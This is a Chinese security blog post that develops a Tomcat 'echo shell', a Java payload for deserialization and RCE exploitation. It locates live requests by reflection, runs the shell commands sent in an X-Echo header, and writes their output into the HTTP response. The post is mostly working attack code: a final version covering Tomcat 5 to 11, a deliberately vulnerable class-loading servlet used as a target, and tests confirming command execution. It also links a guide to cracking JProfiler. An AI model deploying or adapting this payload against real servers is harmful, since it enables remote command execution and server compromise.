---
title: Tomcat 通用回显初见到全版本适配
tags: [Java]
categories: [Note]
index_img: https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_index_img.jpg
date: "2025-08-04 21:42:00"
description: "JProfiler 对象引用查找与编写可维护的代码"
---
## TL;DR

1. 第一次真正去了解回显马，发现还是挺神奇的
2. 很多项目中充斥着只写了一两版的代码，还有直接 CV 的，我将带领大家写出真正可维护的代码（漂亮代码）
3. 学习一下使用 JProfiler 分析 heapDump 的对象引用来解决 Tomcat5 的回显适配

## 前言

在 2024 年 12 月 31 日，当时我刚写 [MemShellParty](https://github.com/ReaJason/MemShellParty) 这个项目没多久，红队大佬 [@xcxmiku](https://github.com/xcxmiku) 就找到我说，能不能加一个回显功能，并给我推荐了 [java-echo-generator](https://github.com/pen4uin/java-echo-generator) 这个项目，起初我以为只是一个命令执行的内存马，当时也正准备写 MemShellParty Agent 通用内存马，所以一直没有去了解这块。

时过境迁

现在 MemShellParty 相对很完善了，所以准备考虑写一些其他 payload 了，后续可能还会做 Web 版的 WebShell 的管理工具（纯玩具版）。

## 回显马

通过 [基于全局储存的新思路 | Tomcat 的一种通用回显方法研究](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3&poc_token=HAwjkGijGUyR1zY-umD7QssU8q_hn9IITb68DX4I) 可了解到，一般反序列化漏洞都是业务环境，无法直接回显带出我们想要的信息，不过通过回显马我们通过对象查找找到 request 和 response 对象，往 response 对象写东西来达到任意业务漏洞环境的回显。

为了和内存马通过线程遍历找 ServletContext 一致，这边我也决定使用线程遍历找 request 实现回显马，而不考虑 Thread.currentThread()、JmxMBeanServer 等等。

## 学习与实现

对于初入网络安全的萌新，做什么东西都感觉已经有大佬铺好路了，只管学就完事了，因此直接找找现成的文章先学习一下思路，根据我装软件的习惯，先不管内容，新的就是最好的。我找到了以下学习资料：

1. [feihong-cs/Java-Rce-Echo/TomcatEcho-全版本.jsp](https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEcho-%E5%85%A8%E7%89%88%E6%9C%AC.jsp)
2. [pen4uin/java-echo-generator/TomcatCmdExecTpl.java](https://github.com/pen4uin/java-echo-generator/blob/main/jeg-core/src/main/java/jeg/core/template/tomcat/TomcatCmdExecTpl.java)
3. [vulhub/java-chains](https://github.com/vulhub/java-chains) — 需要反编译，在 chains-core 中 com.ar3h.chains.gadget.impl.bytecode.echo.template.TomcatEcho2Bytecode.class
4. [基于全局储存的新思路 | Tomcat 的一种通用回显方法研究](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3&poc_token=HAwjkGijGUyR1zY-umD7QssU8q_hn9IITb68DX4I)

怎么说呢，pen4uin/java-echo-generator 的写法和 feihong-cs/Java-Rce-Echo 很像，但是 java 文件里面写各种 var 的变量名，看着就是反编译谁的代码，这不是给人看的，最后只有 vulhub/java-chains 中 [@Ar3h](https://github.com/Ar3h) 的代码稍微能看下去。

以下是 java-chains/TomcatEcho2Bytecode.class 的代码片段

```java
Thread[] var2 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");

for (int var3 = 0; var3 < var2.length; ++var3) {
    Thread var4 = var2[var3];
    if (var4 != null) {
        String var5 = var4.getName();
        if (!var5.contains("exec") && var5.contains("http")) {
            Object var6 = getFV(var4, "target");
            if (var6 instanceof Runnable) {
                try {
                    var6 = getFV(getFV(getFV(var6, "this$0"), "handler"), "global");
                } catch (Exception var141) {
                    continue;
                }

                List var8 = (List) getFV(var6, "processors");
            }
        }
    }
}
```

随便编写一个 Servlet 调试一下 Tomcat 可知，通过 target.this$0.handler.global 这个线程就是 http-nio-8082-Poller 线程，不过在 http-nio-8082-Acceptor 也有获取方式，target.endpoint.handler.global。

![debug-normal](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/debug-normal.png)

接下来就是看下面获取 request 和 response 部分的代码。

```java
List var8 = (List) getFV(var6, "processors");
for (int var9 = 0; var9 < var8.size(); ++var9) {
    Object var10 = var8.get(var9);
    var6 = getFV(var10, "req");
    Object var11 = var6.getClass().getMethod("getResponse").invoke(var6);
    try {
        var5 = (String) var6.getClass().getMethod("getHeader", String.class).invoke(var6, new String(header));
        if (var5 != null && !var5.isEmpty()) {
            String c = new String(Base64.getDecoder().decode(var5));
            String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", c} : new String[]{"/bin/sh", "-c", c};
            writeBody(var11, ((new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next() + "=====").getBytes());
            var1 = true;
        }
        if (var1) {
            break;
        }
    } catch (Exception var13) {
        writeBody(var11, var13.getMessage().getBytes());
    }
}
```

这个地方的 req 类名是 org.apache.coyote.Request，通过 req.getResponse() 获取的 response 类名是 org.apache.coyote.Response，这两个都不是 Servlet 是规范实现，而是 Tomcat 自己的，所以 API 的使用上是有出入的。

当看到这串代码的时候，我的注意力就来到了这个 Exception 的 message 打印逻辑，因为 e.printStackTrace() 是支持传 PrintWriter 的，例如 e.printStracTrace(response.getWriter()) 这种就能把堆栈报错直接往 response 里面塞，不过这儿是 org.apache.coyote.Response，查了以下只有 doWrit 方法，我就去请教 Gemini 老师了，[Tomcat Echo: RCE 漏洞利用技术](https://g.co/gemini/share/48cdf3e0d7e4)，没想到他真会！！！

```java
java.io.StringWriter sw = new java.io.StringWriter();
e.printStackTrace(new java.io.PrintWriter(sw));
String exceptionAsString = sw.toString();
```

但是我又看了看 org.apache.coyote.Response 实现的 writeBody 那个东西又臭又长，i dislike

```java
private static void writeBody(Object var0, byte[] var1) throws Exception {
    byte[] var2 = var1;
    try {
        Class var4 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
        Object var3 = var4.newInstance();
        var4.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var3, var2, new Integer(0), new Integer(var2.length));
        var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
    } catch (Exception var6) {
        Class var4 = Class.forName("java.nio.ByteBuffer");
        Object var3 = var4.getDeclaredMethod("wrap", byte[].class).invoke(var4, var1);
        var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
    }
}
```

转眼我又去看了 [pen4uin/java-echo-generator](https://github.com/pen4uin/java-echo-generator/blob/main/jeg-core/src/main/java/jeg/core/template/tomcat/TomcatCmdExecTpl.java) 的实现方式，发现他拿的就是 ServletResponse 的实现，主要是这个 getNote 方法。

```java
for (int var6 = 0; var6 < var5.size(); ++var6) {
    var3 = var5.get(var6).getClass().getDeclaredField("req");
    var3.setAccessible(true);
    var4 = var3.get(var5.get(var6)).getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var3.get(var5.get(var6)), 1);
    String var7;
    try {
        var7 = (String) var3.get(var5.get(var6)).getClass().getMethod("getHeader", new Class[]{String.class}).invoke(var3.get(var5.get(var6)), new Object[]{getReqHeaderName()});
        if (var7 != null) {
            Object response = var4.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(var4, new Object[0]);
            Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
            writer.write(exec(var7));
            writer.flush();
            writer.close();
            break;
        }
    } catch (Exception ignored) {
    }

}
```

这个我跟了一下源码（方法就是，前面不是打了断点，在堆栈那个视图，一个一个点，看里面的方法体里面有没有相关的东西，有时候点过去位置不对就搜一下方法名，直接看方法），就是 org.apache.catalina.connector.CoyoteAdapter#service 这个前几行。

```java
public static final int ADAPTER_NOTES = 1;

public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {

    Request request = (Request) req.getNote(ADAPTER_NOTES);
    Response response = (Response) res.getNote(ADAPTER_NOTES);

    if (request == null) {
        // Create objects
        request = connector.createRequest();
        request.setCoyoteRequest(req);
        response = connector.createResponse();
        response.setCoyoteResponse(res);

        // Link objects
        request.setResponse(response);
        response.setRequest(request);

        // Set as notes
        req.setNote(ADAPTER_NOTES, request);
        res.setNote(ADAPTER_NOTES, response);

        // Set query string encoding
        req.getParameters().setQueryStringCharset(connector.getURICharset());
    }
}
```

这就简单了，看起来 [pen4uin/java-echo-generator](https://github.com/pen4uin/java-echo-generator/blob/main/jeg-core/src/main/java/jeg/core/template/tomcat/TomcatCmdExecTpl.java) 还是有可以借鉴的地方，学习了，按着这个思路，以下是我的第一版漂亮代码。（注释要写好，以免下次看到又忘记了）getFieldValue 和 invokeMethod 可直接在 MemShellParty 中搜索实现，这个下面就不展示了。

```java
public class TomcatEcho {
    public TomcatEcho() {
        try {
            Set<Thread> threads = Thread.getAllStackTraces().keySet();
            for (Thread thread : threads) {
                Object target = getFieldValue(thread, "target");
                if (target instanceof Runnable) {
                    Object requestGroupInfo;
                    try {
                        requestGroupInfo = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "global");
                    } catch (NoSuchFieldException ignored) {
                        continue;
                    }
                    if (requestGroupInfo == null) {
                        continue;
                    }
                    List<?> processors = (List<?>) getFieldValue(requestGroupInfo, "processors");
                    for (Object processor : processors) {
                        // org.apache.coyote.Request
                        Object coyoteRequest = getFieldValue(processor, "req");
                        // org.apache.catalina.connector.Request
                        Object request = invokeMethod(coyoteRequest, "getNote", new Class[]{Integer.class}, new Object[]{1});
                        // org.apache.catalina.connector.Response
                        Object response = invokeMethod(request, "getResponse", null, null);
                        String data = getDataFromRequest(request);
                        if (data != null && !data.isEmpty()) {
                            PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                            try {
                                writer.write(run(data));
                            } catch (Throwable e) {
                                e.printStackTrace(writer);
                            }
                            writer.flush();
                            writer.close();
                            return;
                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private String getDataFromRequest(Object request) throws Exception {
        return (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"X-Echo"});
    }

    private String run(String data) throws Exception {
        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", data} : new String[]{"/bin/sh", "-c", data};
        return new Scanner((new ProcessBuilder(cmd)).start().getInputStream()).useDelimiter("\\A").next();
    }
}
```

## 自动化测试

写好之后，应该怎么测试，我想这也是为什么那么多人 CV 的原因，大佬写了一版测了那么多，我又不测试，要不就直接 CV 吧，生怕改坏了（或者他这么写一定有他的道理的，还是不改了）。

了解 MemShellParty 的人都知道，里面有超多中间件测试镜像，自带靶场，那测试一个回显自然不在话下。

测试步骤为，在靶场写一个 RCE，然后将回显的字节码发送给靶场，assert 靶场的响应为我们预期即可。

我写了一个超级无敌 RCE 的 base64 defineClass 的漏洞靶场，直接读取 data 中的 base64 类字节码进行加载，并且往响应里面打印类对象（会自动 toString，也可以测其他恶意代码写在 toString 的 payload）。

```java
public class Base64ClassLoaderServlet extends ClassLoader implements Servlet {
    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String data = req.getParameter("data");
        try {
            byte[] bytes = decodeBase64(data);
            Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
            res.getWriter().print(obj);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
```

接下来就是编写测试流程，通过 [Testcontainers](https://java.testcontainers.org/quickstart/junit_5_quickstart/) 启动环境并部署靶场，发送请求 assert 响应结果。

```java
@Slf4j
@Testcontainers
public class Tomcat8ContainerTest {
    public static final String imageName = "tomcat:8-jre8";

    @Container
    public final static GenericContainer<?> container = new GenericContainer<>(imageName)
            .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war") // 挂载靶场包
            .waitingFor(Wait.forHttp("/app")) // 等待靶场成功，/app 可访问
            .withExposedPorts(8080); // 暴露端口

    public static String getUrl(GenericContainer<?> container) {
        int port = container.getMappedPort(8080); // 获取 8080 随机映射端口
        String url = "http://127.0.0.1:" + port + "/app";
        log.info("container started, app url is : {}", url);
        return url;
    }

    @Test
    @SneakyThrows
    void testCommandEcho() {
        String url = getUrl(container);
        String content = DetectionTool.getBase64Class(TomcatEcho.class);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", content)
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("X-Echo", "id")
                .url(url + "/b64").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            System.out.println(container.getLogs()); // 打印 Tomcat 容器日志，在 TomcatEcho 加打印可以直接看
            assertThat(response.body().string(), anyOf(
                    containsString("uid=")
            ));
        }
    }
}
```

3s 左右就能跑完一个中间件的测试，香得一！！！

![test-speed](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/test-speed.png)

接下来就是编写回显命令执行异常的回显情况，执行系统没有的命令

```java
@Test
@SneakyThrows
void testCommandEchoException() {
    String url = getUrl(container);
    String content = DetectionTool.getBase64Class(TomcatEcho.class);
    RequestBody requestBody = new FormBody.Builder()
            .add("data", content)
            .build();
    Request request = new Request.Builder()
            .header("Content-Type", "application/x-www-form-urlencoded")
            .header("X-Echo", "hello")
            .url(url + "/b64").post(requestBody)
            .build();
    try (Response response = new OkHttpClient().newCall(request).execute()) {
        assertThat(response.body().string(), anyOf(
                containsString("hello: not found")
        ));
    }
}
```

代码调整为如下，InputStream 没东西就拿 ErrorStream

```java
private String run(String data) throws Exception {
    String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", data} : new String[]{"/bin/sh", "-c", data};
    Process process = new ProcessBuilder(cmd).start();
    try {
        return new Scanner(process.getInputStream()).useDelimiter("\\A").next();
    } catch (NoSuchElementException e) {
        return new Scanner(process.getErrorStream()).useDelimiter("\\A").next();
    }
}
```

在测试 JDK21 的 Tomcat 环境下一直报错，发现是 JDK21 的线程没有 target 了

```java
Object target = null;
try {
    target = getFieldValue(thread, "target");
} catch (NoSuchFieldException e) {
    // JDK 21
    target = getFieldValue(getFieldValue(thread, "holder"), "task");
}
```

当我在测试 Tomcat5 的环境时，一直失败，自动化测试的好处就是，改了一点代码就能直接跑进行验证，所以我一边打印一边猜测哪里可能有问题进行代码调整，这样测试了好半天也没结果，决定还是起环境调试吧。

## Tomcat5 回显

MemShellParty 自带很多 docker 环境，可直接测试，启动 integration-test/docker-compose/tomcat/docker-compose-5-jdk6.yaml，（war 包就是项目里面的靶场包，编译命令为 `./gradlew :vul:vul-webapp:war`）

```yaml
services:
  tomcat56:
    image: reajason/tomcat:5-jdk6
    ports:
      - "8080:8080"
      - "5005:5005"
    environment:
      JAVA_OPTS: -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
    volumes:
      - ../../../vul/vul-webapp/build/libs/vul-webapp.war:/usr/local/tomcat/webapps/app.war
```

开启远程调试，在靶场的 TestServlet.java 打断点，发请求

![tomcat5-debug](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/tomcat5-debug.png)

我在控制台里面翻了好久，突然想起来大佬说用 [c0ny1/java-object-searcher](https://github.com/c0ny1/java-object-searcher)，不过我还是决定另辟蹊径，使用 HeapDump 配合 JProfiler。

停掉断点，然后进容器进行 heapDump，最后一个 1 为 PID

```bash
[root@b2b07b202dd6 tomcat]# jmap -dump:format=b,file=heapdump.hprof 1
Dumping heap to /usr/local/tomcat/heapdump.hprof ...
Heap dump file created
```

在终端将文件移动出来

```bash
❯ docker ps
CONTAINER ID   IMAGE                    COMMAND                  CREATED          STATUS          PORTS                                                                                      NAMES
b2b07b202dd6   reajason/tomcat:5-jdk6   "/usr/local/tomcat/b…"   10 minutes ago   Up 10 minutes   0.0.0.0:5005->5005/tcp, [::]:5005->5005/tcp, 0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp   tomcat-tomcat56-1
8f40f6fb2832   e334cc02300c             "buildkitd --allow-i…"   3 months ago     Up 11 days                                                                                                 buildx_buildkit_mybuilder0

░▒▓
❯ docker cp b2:/usr/local/tomcat/heapdump.hprof .
Successfully copied 28.7MB to /Users/reajason/Downloads/.
```

打开 JProfiler（激活问题可参考：[记录 JProfiler V15 破解](https://reajason.eu.org/writing/jprofilerv15crackedwithida/)）就会弹出 JProfiler Start Center，点 Open Snapshots 的第一个，然后选中我们的 heapDump 文件。

![jprofiler-center](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-center.png)

![jprofiler-home](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-home.png)

这时候需要我们想一想我们要搜什么对象，根据前文的回显机制，就是获取到 global 里面有 processors 就能遍历请求了，global 这个对象的类名是 org.apache.coyote.RequestGroupInfo，我们就搜这个。

在下面的 Class View Filter 里面输入并回车。可以看到 InstanceCount 实例对象是有两个的。

![jprofiler-class-search](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-class-search.png)

双击，选择 References 里面的 Incoming references，这个意思是查找谁引用了这个对象。另外一个 Outcomming references 就反过来，选中对象引用了哪些其他对象。

![jprofiler-object-set](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-object-set.png)

有两个，这种情况看下差别，很明显我们要拿 RequestInfo 下面这个看起来比较可靠

![jprofiler-requestinfo](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-requestinfo.png)

在第二个对象右键，选择第一个，意为只选中当前对象进行分析，同样弹出的框，仍然选择 Incoming references

![jprofiler-requestinfo-select](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-requestinfo-select.png)

点击一下这个对象，展开一下，这个时候就可以点击右边的 Show Paths to GC Root，这个的目的就是查到对象的引用链路。选择的配置按如图。

![jprofiler-show-gc-config](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-show-gc-config.png)

![jprofiler-show-gc-result](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-show-gc-result.png)

最下面这个 resource 看起来就是 JmxMBeanServer 的方式，因为我们要遍历线程，所以我们需要找最下面一直到 java.lang.Thread 的线路。

红色的向上箭头指的是 GC 路径上的点，但是这种情况信息有点少，在 global 这个节点，点一下收缩，再点一下展开，就能看到更多的信息，如下图

![jprofiler-gc-fields](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-gc-fields.png)

通过翻找和 Thread 相关的节点，找到如下链路

target.toRun.endpoint.handler.global

![jprofiler-route-1](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-route-1.png)

如下是第二条链路

thData.[index].endpoint.handler.global

![jprofiler-route-2](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/jprofiler-route-2.png)

像这种还有很多，大家感兴趣可以自己尝试一下，我们可以开启断点再验证一下。

![route-debug-1](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/route-debug-1.png)

![route-debug-2](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/route-debug-2.png)

两个都是获取到的一个对象，因此都是可用的。为减少代码量，我选择第一条链路，直接属性调用，不需要遍历可以减少代码。

与此同时，我发现在过滤线程时写的 `!var5.contains("exec") && var5.contains("http")` 不够完美，根据前面获取 request 的方式，我们就是希望从 Poller 或者 Acceptor 线程拿，因此我们可以直接指定线程特征进行解析，后续为了优化这个线程过滤的判断，我打印了所有命中的 threadName 和 targetClassName（已在注释中标记），也顺便排除了一下 ajp 线程。

## 最终实现

```java
public class TomcatEcho {

    static {
        new TomcatEcho();
    }

    public TomcatEcho() {
        try {
            Set<Thread> threads = Thread.getAllStackTraces().keySet();
            for (Thread thread : threads) {
                Object target = null;
                try {
                    target = getFieldValue(thread, "target");
                } catch (NoSuchFieldException e) {
                    // JDK 21
                    target = getFieldValue(getFieldValue(thread, "holder"), "task");
                }
                if (target == null) {
                    continue;
                }
                Object requestGroupInfo = null;
                // Tomcat6 http-8080-Acceptor-0 <-> org.apache.tomcat.util.net.JIoEndpoint$Acceptor
                // Tomcat7 http-apr-8080-Poller <-> org.apache.tomcat.util.net.AprEndpoint$Poller
                // Tomcat8 http-nio-8080-Poller <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                // Tomcat9 http-nio-8080-ClientPoller-0 <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                // Tomcat10 http-nio-8080-Poller <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                // Tomcat11 http-nio-8080-Poller <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                String threadName = thread.getName();
                if ((threadName.contains("Poller") || threadName.contains("Acceptor"))
                        && !threadName.contains("ajp")
                ) {
                    try {
                        requestGroupInfo = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "global");
                    } catch (NoSuchFieldException ignored) {
                        continue;
                    }
                } else if (target.getClass().getName().contains("ThreadPool$ControlRunnable")) {
                    // Tomcat5 http-8080-Processor23 <-> org.apache.tomcat.util.threads.ThreadPool$ControlRunnable
                    try {
                        Object toRun = getFieldValue(target, "toRun");
                        if (toRun != null) {
                            requestGroupInfo = getFieldValue(getFieldValue(getFieldValue(toRun, "endpoint"), "handler"), "global");
                        }
                    } catch (NoSuchFieldException e) {
                        continue;
                    }
                }
                if (requestGroupInfo == null) {
                    continue;
                }
                List<?> processors = (List<?>) getFieldValue(requestGroupInfo, "processors");
                for (Object processor : processors) {
                    // org.apache.coyote.Request
                    Object coyoteRequest = getFieldValue(processor, "req");
                    // org.apache.catalina.connector.Request
                    Object request = invokeMethod(coyoteRequest, "getNote", new Class[]{Integer.TYPE}, new Object[]{1});
                    // org.apache.catalina.connector.Response
                    Object response = invokeMethod(request, "getResponse", null, null);
                    String data = getDataFromRequest(request);
                    if (data != null && !data.isEmpty()) {
                        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                        try {
                            writer.write(run(data));
                        } catch (Throwable e) {
                            e.printStackTrace(writer);
                        }
                        writer.flush();
                        writer.close();
                        return;
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private String getDataFromRequest(Object request) throws Exception {
        return (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"X-Echo"});
    }

    private String run(String data) throws Exception {
        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", data} : new String[]{"/bin/sh", "-c", data};
        Process process = new ProcessBuilder(cmd).start();
        try {
            return new Scanner(process.getInputStream()).useDelimiter("\\A").next();
        } catch (NoSuchElementException e) {
            return new Scanner(process.getErrorStream()).useDelimiter("\\A").next();
        }
    }

     @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }
}
```

MemShellParty 2.0 已发布，欢迎使用~。

## 额外的测试

RequestGroupInfo 中拿到的 processors 是 Tomcat 整个生命周期所有的 RequestInfo 对象，其中也包含其他业务请求，当业务在高并发环境下做回显马利用，会不会有修改其他业务请求回显的风险，导致业务行为中断。

测试方法，编写 K6 压测脚本，10 线程并行压测业务接口，并断言响应码为 200，调整回显马代码，回显成功时修改 response.statusCode 为 201，在压测过程中，发送回显马利用，如果有影响，压测报告中会有不是 200 的响应结果。**结论是当前回显马并不会影响正常业务**。

压测脚本：k6test.js

```js
import http from 'k6/http';
import {check, sleep} from 'k6';

export const options = {
    rps: 4500,
    vus: 10,
    duration: '5m',
};

export default function () {
    const res = http.get('http://localhost:8082/app/test');
    check(res, {
        'status is 200': (r) => r.status === 200,
    });
    sleep(1);
}

```

回显马调整：

```java
if (data != null && !data.isEmpty()) {
    PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
    try {
        writer.write(run(data));
    } catch (Throwable e) {
        e.printStackTrace(writer);
    }
    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{201}); // 这儿设置新的状态码
    writer.flush();
    writer.close();
    return;
}
```

新写一个单测，用于回显马利用：

```java
public class EchoTest {
    @Test
    @SneakyThrows
    void test() {
        String url = "http://localhost:8082/app";
        String content = DetectionTool.getBase64Class(TomcatEcho.class);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", content)
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("X-Echo", "id")
                .url(url + "/b64").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertEquals(201, response.code());
            assertThat(response.body().string(), anyOf(
                    containsString("uid=")
            ));
        }
    }
}
```

启动靶场，并开启压测脚本：

```bash
k6 run k6test.js 
```

运行回显马单测成功，且压测数据无异常

```text
EchoTest > test() PASSED
```

```text
❯ k6 run asserts/k6test.js

         /\      Grafana   /‾‾/  
    /\  /  \     |\  __   /  /   
   /  \/    \    | |/ /  /   ‾‾\ 
  /          \   |   (  |  (‾)  |
 / __________ \  |_|\_\  \_____/ 

     execution: local
        script: asserts/k6test.js
        output: -

     scenarios: (100.00%) 1 scenario, 10 max VUs, 5m30s max duration (incl. graceful stop):
              * default: 10 looping VUs for 5m0s (gracefulStop: 30s)
  █ TOTAL RESULTS 

    checks_total.......................: 2820    9.398366/s
    checks_succeeded...................: 100.00% 2820 out of 2820
    checks_failed......................: 0.00%   0 out of 2820

    ✓ status is 200

running (5m00.1s), 00/10 VUs, 2820 complete and 0 interrupted iterations
default ✓ [======================================] 10 VUs  5m0s
```

额外的发现，processor 这个对象就是 RequestInfo，注释说 without having to deal with synchronization，不用关系线程安全的问题，我测试了一下当前线程下只会有一个能用的。

```java
/**
 * Structure holding the Request and Response objects. It also holds statistical information about request processing
 * and provide management information about the requests being processed. Each thread uses a Request/Response pair that
 * is recycled on each request. This object provides a place to collect global low-level statistics - without having to
 * deal with synchronization ( since each thread will have it's own RequestProcessorMX ).
 *
 * @author Costin Manolache
 */
public class RequestInfo {
}
```

因此回显马也可以改为如下：（不推荐，在 Tomcat 低版本不可用）

```java
for (Object processor : processors) {
    Integer stage = (Integer) getFieldValue(processor, "stage");
    if (stage == 7) { // org.apache.coyote.Constants#STAGE_ENDED
        continue;
    }
    // org.apache.coyote.Request
    Object coyoteRequest = getFieldValue(processor, "req");
    // org.apache.catalina.connector.Request
    Object request = invokeMethod(coyoteRequest, "getNote", new Class[]{Integer.TYPE}, new Object[]{1});
    // org.apache.catalina.connector.Response
    Object response = invokeMethod(request, "getResponse", null, null);
    String data = "id"; // 直接将执行命令内置在字节码中
    PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
    try {
        writer.write(run(data));
    } catch (Throwable e) {
        e.printStackTrace(writer);
    }
    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{201});
    writer.flush();
    writer.close();
    return;
}
```
